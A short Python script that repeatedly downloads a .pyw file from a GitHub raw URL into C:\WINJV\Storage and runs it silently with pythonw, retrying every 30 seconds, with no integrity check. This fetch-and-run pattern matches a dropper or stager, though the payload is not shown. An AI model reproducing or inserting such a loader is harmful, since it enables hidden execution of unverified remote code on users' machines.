import requests
import subprocess
import os
import time

def download_and_open_file(url, destination_path):
    while True:
        try:
            response = requests.get(url)
            response.raise_for_status()  # Raise an HTTPError for bad responses

            with open(destination_path, 'wb') as file:
                file.write(response.content)

            print(f"File downloaded successfully to {destination_path}")

            # Open the file using the default Python interpreter for .pyw files
            python_executable = 'pythonw.exe' if os.name == 'nt' else 'pythonw'
            subprocess.run([python_executable, destination_path])

            break  # Exit the loop if successful

        except requests.exceptions.RequestException as e:
            print(f"Error downloading the file: {e}")

        except subprocess.CalledProcessError as e:
            print(f"Error opening the file: {e}")

        # Wait for 30 seconds before retrying
        time.sleep(30)

if __name__ == "__main__":
    # Replace the URL with the URL of the .pyw file you want to download
    file_url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.py"

    # Replace the destination path with the path where you want to save the .pyw file
    destination_path = r"C:\WINJV\Storage\Reporter.pyw"

    download_and_open_file(file_url, destination_path)
